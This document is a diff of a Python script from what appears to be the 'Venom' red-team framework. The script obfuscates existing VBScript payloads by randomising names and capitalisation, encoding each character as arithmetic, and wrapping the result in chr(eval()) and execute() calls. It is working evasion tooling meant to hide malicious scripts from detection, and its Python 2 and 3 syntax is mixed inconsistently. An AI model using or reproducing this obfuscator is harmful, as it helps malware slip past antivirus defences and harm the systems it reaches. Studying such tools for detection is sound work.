@@ -1,32 +1,47 @@
 #!/usr/bin/python
-
-
 """
-vbs-obfuscator.py
- 
-Use this script to encrypt one existance .vbs
-payload using random ancii chars
+Author: r00t-3xp10it [SSA RedTeam @2020]
+Framework: Venom v1.0.17 - vbs-obfuscator.py
+Description: Use this script to encrypt one
+existing .vbs payload using random ancii chars
 
 """
 
 
-# dependencies 'import'
+## Dependencies 'import'
 import random, sys, string, time
 
 
+## Script colors
+WHITE = '\033[1m\033[0m'
+GREEN = '\033[1m\033[92m'
+YELLOW = '\033[1m\033[93m'
+RED = '\033[1m\033[91m'
+BLUE = '\033[1m\033[94m'
+
+
+## Script banner
+banner = """
+ +------------------------------------------------+
+ |               * vbs-obfuscator *               |
+ | Obfuscate .VBS files using random ANCII chars  |
+ +------------------------------------------------+
+	 """
+print(BLUE + banner)
+
+
+## Dependencies checks
 # params: Script-name, input-file, output-file
 if len(sys.argv) <> 3:
-	print "Usage: python vbs-obfuscator.py infile.vbs outfile.vbs"
+	print(RED + "[ERROR] Usage: " + YELLOW + "python vbs-obfuscator.py infile.vbs outfile.vbs" + WHITE)
 	sys.exit()
 
-
 	
-print "encrypting payload using ramdom ancii chars!"
-print "---"
-time.sleep(1.5)
+print(YELLOW + "Obfuscating " + sys.argv[1] + " payload!")
+print(BLUE + "--------------------------------")
+time.sleep(3.5)
 
-
-# randomize each character
+## Randomize each character
 splitter = str(chr(42))
 def randCapitalization(characters):
 	capicharacter = ""
@@ -39,14 +54,14 @@ def randCapitalization(characters):
 	return capicharacter
 
 
-# random function names
+## Random function names
 NUM_OF_CHARS = random.randrange(5, 60)
 pld = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))
 array = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))
 temp = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))
 x = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(NUM_OF_CHARS))
 
-# store in encBody the obfuscated content
+## Store in encBody the obfuscated content
 def obfu(body):
 	encBody = ""
 	for i in range(0, len(body)):
@@ -62,6 +77,7 @@ def expr(char):
 
 	if exp == 0:
 		print "Char " + str(char) + " -> " + str((range+char)) + "-" + str(range)
+                time.sleep(0.05)
 		return str((range+char)) + "-" + str(range)
 	if exp == 1:
 		print "Char " + str(char) + " -> " + str((char-range)) + "+" + str(range)
@@ -71,7 +87,7 @@ def expr(char):
 		return str((char*range)) + "/" + str(range)
 
 
-# Write to destination file
+## Write to destination file
 clear_text_file = open(sys.argv[1], "r")
 obfuscated_file = open(sys.argv[2], "w")
 obfuscated_file.write(randCapitalization("Dim " + pld + ", " + array + ", " + temp) + "\n")
@@ -82,9 +98,9 @@ obfuscated_file.write(randCapitalization(temp + " = " + temp + " & chr(eval(" + 
 obfuscated_file.write(randCapitalization("next") + "\n")
 obfuscated_file.write(randCapitalization("execute(" + temp) + ")\n")
 
-# Close file handles before exit
+## Close file handles before exit
 clear_text_file.close()
 obfuscated_file.close()
-print "---"
-print "vbs payload successfully obfuscated!"
-time.sleep(2)
+print("--------------------------------" + YELLOW)
+print("payload " + BLUE + sys.argv[1] + YELLOW + " successfully obfuscated!")
+time.sleep(2.6)
